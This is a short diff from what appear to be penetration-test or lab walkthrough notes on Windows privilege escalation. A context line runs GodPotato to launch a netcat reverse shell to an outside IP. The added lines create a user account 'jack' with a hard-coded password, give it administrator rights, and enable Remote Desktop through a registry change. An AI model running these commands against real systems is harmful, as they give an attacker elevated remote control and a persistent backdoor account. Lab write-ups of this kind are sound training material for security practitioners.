@@ -54,7 +54,9 @@ GodPotato-NET4.exe -cmd "nc.exe 192.168.49.102 80 -e cmd.exe"
 
 limited shell therefore added new user and enabled rdp
 
-
+net user /add jack Password@12345
+net localgroup administrators jack /add
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
 
 
